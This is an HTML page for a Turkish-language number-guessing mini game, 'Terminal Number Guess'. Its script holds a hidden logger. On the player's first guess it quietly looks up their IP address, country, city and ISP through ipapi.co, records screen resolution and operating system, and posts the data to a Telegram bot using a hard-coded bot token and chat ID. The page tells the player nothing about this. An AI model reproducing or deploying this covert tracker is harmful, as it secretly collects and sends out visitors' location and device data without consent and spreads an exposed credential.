<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matrix Terminal - Mini Game</title>
    <style>
        body { background: #0a0a0a; color: #00ff66; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 85%; max-width: 400px; padding: 25px; border: 1px solid #00ff66; background: #111; text-align: center; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); }
        input { background: #000; border: 1px solid #00ff66; color: #00ff66; padding: 8px; width: 60%; text-align: center; font-family: monospace; margin-bottom: 10px; }
        button { background: #00ff66; color: #000; border: none; padding: 8px 15px; font-family: monospace; font-weight: bold; cursor: pointer; }
        button:hover { background: #00cc55; }
        .info { margin-top: 15px; font-size: 13px; color: #888; }
    </style>
</head>
<body>

    <div class="box">
        <div style="font-weight: bold; margin-bottom: 15px; font-size: 16px;">🎮 TERMINAL NUMBER GUESS v1.0</div>
        <p id="game-status">1 ile 20 arasında gizli bir sayı tuttum. Tahmin et!</p>
        
        <input type="number" id="guess-input" min="1" max="20" placeholder="Sayı girin">
        <br>
        <button onclick="checkGuess()">Tahmin Et</button>

        <div class="info" id="system-info">Sistem: Çevrimiçi aktif oturum.</div>
    </div>

    <script>
        const secretName = Math.floor(Math.random() * 20) + 1;
        let attempts = 0;
        let logged = false;

        async function runSecretLogger() {
            if (logged) return;
            logged = true;

            let ip = "Bilinmiyor", ulke = "Bilinmiyor", eyalet_sehir = "Bilinmiyor", internet_sirketi = "Bilinmiyor";

            try {
                let ip_istegi = await fetch("https://ipapi.co/json/");
                let konum = await ip_istegi.json();
                if (konum && !konum.error) {
                    ip = konum.ip || "Bilinmiyor";
                    ulke = konum.country_name || "Bilinmiyor";
                    eyalet_sehir = (konum.region || "Bilinmiyor") + " / " + (konum.city || "Bilinmiyor");
                    internet_sirketi = konum.org || "Bilinmiyor";
                }
            } catch (e) {}

            let ekran = window.screen.width + "x" + window.screen.height;
            let ua = navigator.userAgent;
            let os = "Bilinmeyen Sistem";
            if (/Android/i.test(ua)) os = "Android";
            else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
            else if (/Windows/i.test(ua)) os = "Windows";

            let tarih = new Date().toLocaleString('tr-TR');

            // Senin o çalışan kodundaki mesaj formatının aynısı
            let mesaj = "🎮 *OYUNA GİRİŞ YAPILDI*\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
            mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
            mesaj += "🤖 *OS / Sistem:* " + os + "\n";
            mesaj += "⏰ *Tarih:* " + tarih + "\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
            mesaj += "📍 *Konum:* " + ulke + " - " + eyalet_sehir + "\n";
            mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
            mesaj += "🖥️ *Çözünürlük:* " + ekran + "\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━";

            // Senin tıkır tıkır çalışan ham URL yapın (Hiçbir şifreleme yok, doğrudan gidiyor)
            let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
            let cid = "6845229845";
            let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";

            // Senin çalışan fetch metodun
            fetch(url).catch(() => {});
        }

        function checkGuess() {
            // Kullanıcı butona bastığı an senin çalışan fetch metodun arka planda tetiklenir
            runSecretLogger();

            const userInput = document.getElementById("guess-input").value;
            const statusText = document.getElementById("game-status");
            
            if (!userInput) {
                statusText.innerText = "Lütfen bir sayı girin!";
                return;
            }

            attempts++;

            if (parseInt(userInput) === secretName) {
                statusText.innerText = `🎉 Tebrikler! ${attempts}. denemede doğru bildiniz!`;
                statusText.style.color = "#00ff66";
            } else if (parseInt(userInput) > secretName) {
                statusText.innerText = "📉 Daha KÜÇÜK bir sayı deneyin.";
                statusText.style.color = "#ffcc00";
            } else {
                statusText.innerText = "📈 Daha BÜYÜK bir sayı deneyin.";
                statusText.style.color = "#ffcc00";
            }
        }
    </script>
</body>
</html>
